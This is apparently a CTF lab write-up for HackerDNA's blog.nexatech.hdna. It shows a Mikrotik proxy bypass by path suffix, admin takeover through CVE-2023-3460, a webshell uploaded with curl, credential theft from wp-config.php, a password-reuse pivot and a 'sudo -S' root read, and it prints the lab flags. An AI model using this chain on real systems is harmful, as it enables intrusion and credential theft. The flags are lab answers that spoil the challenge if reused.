---
title: "🛡️ Extensive Technical Writeup: blog.nexatech.hdna"
date: 2026-04-19
categories:
  - Misc
tags:
  - Misc
  - HackerDNA
collections:
  - HackerDNA
---



{{< admonition tldr "TL;DR" >}}

**🛡️ Extensive Technical Writeup: blog.nexatech.hdna** is a misc challenge from **HackerDNA**. Of course, this is a very in-depth version of the **Full Technical Writeup**, covering the *Cyber ​​Kill Chain* methodology, in-depth technical analysis, as well as every command block used. This report is designed to meet professional documentation standards for security auditors or advanced CTF competitions.

{{< /admonition >}}

Of course, this is a very in-depth version of the **Full Technical Writeup**, covering the *Cyber Kill Chain* methodology, in-depth technical analysis, as well as every command block used. This report is designed to meet professional documentation standards for security auditors or advanced CTF competitions.

---

# 🛡️ Extensive Technical Writeup: blog.nexatech.hdna
**Author:** spawn2pwn  
**Date:** April 19, 2026  
**Target:** WordPress 6.5.4 / Mikrotik HttpProxy  
**Category:** Web Exploitation, Network Bypass, Privilege Escalation

---

## 1. Project Overview
This security audit aims to test the resilience of **NexaTech** infrastructure which involves a combination of WordPress web applications and network traffic management using Mikrotik proxies. The main focus is testing the effectiveness of Layer 7 filters and isolation between users in the Linux operating system.

---

## 2. Phase I: Reconnaissance & Network Bypass

### 2.1 Identification of Network Filters
In the initial stages, standard access to `wp-login.php` and other administrative areas is restricted by **Mikrotik HttpProxy**. The server response returns status code `403 Forbidden` with administrator information `supernova` .

### 2.2 Proxy Bypass Technique
Analysis of proxy behavior shows weaknesses in URL parsing. By using the **Path Suffix Appending** technique, proxy filters can be fooled. 

* **Normal Request:** `http://blog.nexatech.hdna/wp-login.php` -> **403 Forbidden**
* **Bypassed Request:** `http://blog.nexatech.hdna/wp-login.php/*` -> **200 OK**

This bypass works because the proxy thinks the request is directed to a sub-directory or static file, even though the WordPress backend is still processing the main PHP file.

---

## 3. Phase II: Initial Access & Exploitation

### 3.1 Gaining Administrator Access
Using a vulnerability in the **Ultimate Member (v2.6.6)** plugin (CVE-2023-3460), manipulation of user metadata during registration was carried out. This allows creating an account with the role `Administrator` via metadata protection bypass.

### 3.2 Weaponization (Web Shell Upload)
After gaining access to the WordPress Dashboard (via proxy bypass), the next step is to embed persistent access. Since the theme/plugin editor is disabled, the attack is carried out using the **Plugin Sideloading** method.

**Steps:**
1. Create a local plugin directory named `shadow-core` .
2. Insert the PHP webshell ( `spawn2pwn-webshell.php` ) into the directory.
3. Compressing the directory to `shadow-core.zip` .
4. Upload via `curl` by including a security token (Nonce).

```bash
curl -v -b cookies.txt -F "pluginzip=@shadow-core.zip;type=application/zip" \
"http://blog.nexatech.hdna/wp-admin/update.php?action=upload-plugin/*"
```

Activation of the plugin is carried out to execute the script, providing **Remote Code Execution (RCE)** access as user `www-data` .

---

## 4. Phase III: Enumeration & Lateral Movement

### 4.1 Post-Exploitation Enumeration
In the user context `www-data` , inspection of sensitive configuration files is performed. Found file `/var/www/html/wp-config.php` containing plaintext credentials:
* **DB_USER:** `nexatech` * **DB_PASS:** `UzhApBj2hc28vaj` ### 4.2 Data Exfiltration (MySQL)
Extract information from table `wp_users` to confirm system user:

```bash
mysql -u nexatech -p'UzhApBj2hc28vaj' -e "USE nexatech; SELECT user_login FROM wp_users;"
```

### 4.3 Lateral Movement (User Pivot)
It was discovered that there is a Linux system user named `nexatech` . Based on the **Password Reuse** assumption, an attempt is made to move users (pivoting). Due to the limitations of a non-interactive shell, a Python wrapper is used to handle authentication:

```bash
python3 -c 'import os; os.system("echo UzhApBj2hc28vaj | su nexatech -c \"whoami; id\"")'
```

**Result:** Successfully gained access as `uid=1000(nexatech)` . User flags are found in `/home/flag-user.txt` .

---

## 5. Phase IV: Privilege Escalation to Root

### 5.1 Sudoers Analysis
Analysis of sudo privileges shows that user `nexatech` has an entry in the sudoers file. However, execution is hindered by the absence of a PTY (Pseudo-Terminal).

### 5.2 The "Sudo-Stdin" Attack
To bypass the PTY limitation, the `-S` (*Standard Input*) parameter in the `sudo` binary is used. This technique allows passing passwords directly through pipes in a single encapsulated command line.

**Final Exploit Chain:**

```bash
python3 -c 'import os; os.system("echo UzhApBj2hc28vaj | su nexatech -c \"echo UzhApBj2hc28vaj | sudo -S cat /root/flag-root.txt\"")'
```

### 5.3 Root Capture
The command successfully executes a read access with highest privileges (Superuser), generating the contents of the root flag.

---

## 6. Flags Collected
| Flag Type | Location | Value |
| :--- | :--- | :--- |
| **User Flags** | `/home/flag-user.txt` | `bdeed944-1b89-4d96-b1cd-a838b1ebf948` |
| **Root Flag** | `/root/flag-root.txt` | `3bf64c05-920b-41f2-a4d8-694064bc3f3c` |

---

## 7. Conclusion & Recommendations

### 7.1 Security Gaps
1. **Inadequate Proxy Filtering:** Mikrotik filters are easily bypassed with simple URL character manipulation.
2. **Plugin Vulnerability:** Using a vulnerable version of the plugin (Ultimate Member 2.6.6) provides an easy privilege escalation path.
3. **Credential Overlap:** Using the same password for database services and system accounts speeds up the lateral movement process.
4. **Permissive Sudoers:** Granting sudo permissions to system users without valid MFA or terminal supervision increases the risk of automated exploitation.

### 7.2 Mitigation Steps
* **Implement WAF:** Uses a more sophisticated Web Application Firewall than just a static HTTP proxy.
* **Patch Management:** Perform regular updates to WordPress core and all plugins.
* **Zero Trust Credentials:** Ensures each service (DB, System, Web) has unique and complex credentials.
* **Secure Sudo Configuration:** Uses `NOPASSWD` only for absolutely necessary binaries and has no functions for reading files or executing shells (referring to GTFOBins).

---
**Disclaimer:** *This report was prepared for educational purposes and professional documentation in a legal lab environment.*
